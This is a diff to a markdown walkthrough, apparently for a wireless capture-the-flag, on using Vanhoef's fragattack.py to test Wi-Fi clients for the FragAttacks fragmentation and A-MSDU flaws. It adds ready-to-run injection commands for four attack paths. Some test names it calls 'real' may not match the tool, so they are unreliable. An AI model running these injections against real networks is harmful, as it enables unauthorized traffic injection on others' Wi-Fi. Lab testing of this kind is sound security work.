@@ -11,10 +11,27 @@ mechanics.
 - MC-MitM setup (see `mc-mitm/walkthrough.md`).
 - Scapy or Vanhoef's `fragattack.py` for crafted frame injection.
 
+## Invocation shape
+
+`fragattack.py` takes a single wireless iface (not `-mon` suffix —
+the script manages monitor mode) plus test-name and IP flags:
+
+```
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 <test-name>
+```
+
+`--ip` is the attacker's chosen IP; `--peerip` is the AP/router IP the
+target is expected to answer. The script's success signal is an ICMP
+echo response landing back at the attacker.
+
 ## Path A — A-MSDU flag confusion (CVE-2020-24588)
 
 The idea: inject a plaintext frame the client parses as an A-MSDU
-subframe destined for itself.
+subframe destined for itself. Real test names in `fragattacks`:
+`amsdu-inject` (SPP A-MSDU injection), `amsdu-bad` (A-MSDU with bad
+checksum, forces some stacks to still parse), `ping I,E,E` (plaintext
+inject) and `ping I,E,D` (encrypted mixed).
 
 ```
 # 1. MC-MitM channel setup.
@@ -24,7 +41,13 @@ subframe destined for itself.
 
 git clone https://github.com/vanhoefm/fragattacks
 cd fragattacks
-sudo ./fragattack.py wlan1mon amsdu-inject
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 amsdu-inject
+# variants:
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 amsdu-bad
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 ping I,E,E
 ```
 
 Vanhoef's script prompts for the target MAC + AP MAC and orchestrates
@@ -35,40 +58,54 @@ delivered to the local IP stack as if it came from the AP.
 
 The trick: send fragment #1 encrypted with the old (pre-rekey) key
 and fragment #2 with the new key. Some receivers reassemble across
-the rekey.
+the rekey. Real test names: `ping I,E,D` (encrypted mixed with a
+decrypted trailing frag), `eapol-2-frags`, `eapol-3-frags` for the
+EAPOL-fragment variants.
 
 ```
 # 1. Force a rekey (patient — wait for the GTK/PTK rekey interval).
 # 2. Immediately after, send fragment #1 encrypted with the old key
 #    but a modified fragment #2 payload from the attacker.
-sudo ./fragattack.py wlan1mon mixed-key-attack
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 ping I,E,D
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 eapol-2-frags
 ```
 
 ## Path C — Fragment cache poisoning at (re)connect (CVE-2020-24586)
 
 Some stacks don't clear the fragment cache on disconnect. Fill the
 cache with attacker-controlled fragments before the victim
-reconnects; the reconnect flushes it into the packet stream.
+reconnects; the reconnect flushes it into the packet stream. Real
+test names: `cache-inject-1`, `cache-inject-2` (variants for
+different clearing behaviors), plus the `linux-plain` /
+`linux-plain-mc` tests for Linux-specific plaintext cache paths.
 
 ```
-sudo ./fragattack.py wlan1mon cache-poison
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 cache-inject-1
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 linux-plain
 ```
 
 ## Path D — Broadcast fragment plaintext acceptance
 
 Some clients accept plaintext broadcast fragments inside an
-encrypted BSS. Vanhoef's script includes an option to test this
-per-target.
+encrypted BSS. Real test names: `broadcast-frag` and
+`broadcast-eapol`.
 
 ```
-sudo ./fragattack.py wlan1mon ping-broadcast-frag
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 broadcast-frag
+sudo python3 fragattack.py wlan1 \
+    --ip 192.168.1.100 --peerip 192.168.1.1 broadcast-eapol
 ```
 
 ## Reading the results
 
-Vanhoef's script includes a companion `test-tool` that pings the
-target with an ICMP echo whose payload lands only if the primitive
-succeeded. Successful reception = vulnerable.
+`fragattack.py` embeds a probe: on success the target answers an ICMP
+echo whose payload identifies the primitive. Successful reception on
+the attacker iface = vulnerable.
 
 For WCTF, the flag surface is usually:
 
